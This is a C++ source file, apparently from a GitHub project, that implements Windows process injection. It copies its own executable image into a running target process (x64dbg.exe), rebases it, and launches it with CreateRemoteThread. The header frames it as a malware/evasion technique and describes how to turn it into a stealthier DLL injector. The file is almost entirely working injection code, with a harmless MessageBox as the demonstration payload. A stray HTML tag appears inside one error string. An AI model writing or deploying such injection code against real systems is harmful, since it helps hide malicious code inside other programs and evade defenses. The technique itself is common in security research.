
/*
Process Injection: Copy current process into target process and begin execution
Topic: Malware/Evasion, Process Manipulation
Can likely be extended to a work as a DLL injector which doesn't rely on LoadLibrary being called (only writable memory is needed in a target process).
-> Change project type to .dll, make second project which loads this project as .dll and call InsertProcess in our dll on the target process.
-> possibly dllexport the InsertProcess function and call it from another project, the DLL will copy all its bytes to the target and then run its DLLMain (you must change main() offset to Dllmain()).
by AlSch092 @ Github, Aug. 6 2023
*/
#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>
#include <tlhelp32.h> 

bool g_Inserted = false; //switch determines program flow

int main(int argc, char** argv); //forward decl as we need this address in InsertProcess
DWORD GetTargetThreadIDFromProcName(const wchar_t * ProcName);

const wchar_t* target_process = L"x64dbg.exe";

bool CopyImageToTargetProcess(DWORD processId)
{
	if (g_Inserted)
		return false;

	DWORD dwOldProt = 0;
	HANDLE hProcess = GetCurrentProcess();

	HMODULE hModule = GetModuleHandle(NULL);
	LPVOID baseAddress = hModule;
	DWORD dwProt = 0;
	DWORD threadId = 0;

	//Get the image size
	MODULEINFO moduleInfo;
	GetModuleInformation(hProcess, hModule, &moduleInfo, sizeof(MODULEINFO));
	SIZE_T imageSize = moduleInfo.SizeOfImage;

	HANDLE targetProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	if (targetProc == NULL)
	{
		printf("Failed to open target process: %d with error %d\n", processId, GetLastError());
		return false;
	}

	LPVOID newImageAddress = VirtualAllocEx(targetProc, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //Allocate memory for the new image in the target process

	if (newImageAddress != NULL)
	{
		BYTE* shadow_proc = new BYTE[imageSize];

		g_Inserted = true; //needs to go before the memcpy call, otherwise the shadow copy wont reflect this

		//Update the image base address!
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)baseAddress;
		PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)baseAddress + pDosHeader->e_lfanew);

		if (!VirtualProtect(pNtHeaders, sizeof(IMAGE_NT_HEADERS), PAGE_EXECUTE_READWRITE, &dwOldProt))
		{
			printf("Failed to VirtualProtect on host process pNtHeaders with error %d\n", GetLastError());
			g_Inserted = false;
			return false;
		}

		pNtHeaders->OptionalHeader.ImageBase = (DWORD_PTR)newImageAddress; //non-offset address in image header needs to be updated

		memcpy(shadow_proc, baseAddress, imageSize);

		if (!VirtualProtect(pNtHeaders, sizeof(IMAGE_NT_HEADERS), dwOldProt, &dwOldProt)) //change back to old page protections
		{
			printf("Failed to VirtualProtect on host process pNtHeaders with error %d\n", GetLastError());
			g_Inserted = false;
			return false;
		}

		SIZE_T nBytesWritten;
		if (!WriteProcessMemory(targetProc, newImageAddress, shadow_proc, imageSize, &nBytesWritten)) //write all sections of image to target process
		{
			printf("Failed to write memory of target process: %d with error %d\n", processId, GetLastError());
			g_Inserted = false;
			return false;
		}

		printf("Wrote %d bytes to target process\n", nBytesWritten);

		if (!VirtualProtectEx(targetProc, newImageAddress, imageSize, PAGE_EXECUTE_READ, &dwOldProt))
		{
			printf("Failed to VirtualProtectEx on target process memory with error %d\n", GetLastError());
			g_Inserted = false;
			return false;
		}

		UINT64 mainFuncOffset = (UINT64)main - (UINT64)moduleInfo.lpBaseOfDll; //Get offset of our main routine

		UINT64 rebased_main = (UINT64)(newImageAddress)+mainFuncOffset; //main is not the 'true start' of a program, but most things should be initialized by the target process and thus we can skip directly to calling main in a new thread.

		printf("rebased_main at %llX\n", rebased_main);

		HANDLE hThread = CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)rebased_main, NULL, 0, &threadId); //now we create a new thread to resume execution at the new image location or some custom spot

		if (hThread == NULL)
		{
			printf("Could not start thread at rebased_main in target process: %d\n", GetLastError());
			g_Inserted = false;
			return false;
		}
	}
	else
	{
		printf("Failed to allocate memory for the new image.\n");
		g_Inserted = false;
		return false;
	}

	return true;
}

int main(int argc, char** argv)
{
	if (!g_Inserted)
	{
		if (CopyImageToTargetProcess(GetTargetThreadIDFromProcName(target_process))) //make sure architecture of target matches this project
		{
			printf("Successfully inserted process!\n");
			exit(0);
		}
		else
		{
			printf("Failed to insert process!\n");
			exit(-1);
		}
	}

	//!! flow only reaches here from inside the target process !!
	MessageBoxA(0, "Hello from the target process!", "Process Injector", 0);

	//AFTER we insert our code into a live exe, we need to call APIs by building function pointers at runtime
	//because when we enter into another address space the loaded modules base addresses might differ, leading to program crash. 

	return 0;
}

DWORD GetTargetThreadIDFromProcName(const wchar_t * ProcName) //get pid from executable/process name
{
	PROCESSENTRY32 pe;
	HANDLE thSnapShot;
	BOOL retval, ProcFound = false;

	thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE)
	{
		printf("Error: Unable <strong class=\"highlight\">to</strong> create toolhelp snapshot!");
		return 0;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	retval = Process32First(thSnapShot, &pe);
	while (retval)
	{
		if (wcscmp(pe.szExeFile, ProcName) == 0)
			return pe.th32ProcessID;

		retval = Process32Next(thSnapShot, &pe);
	}

	return 0;
}
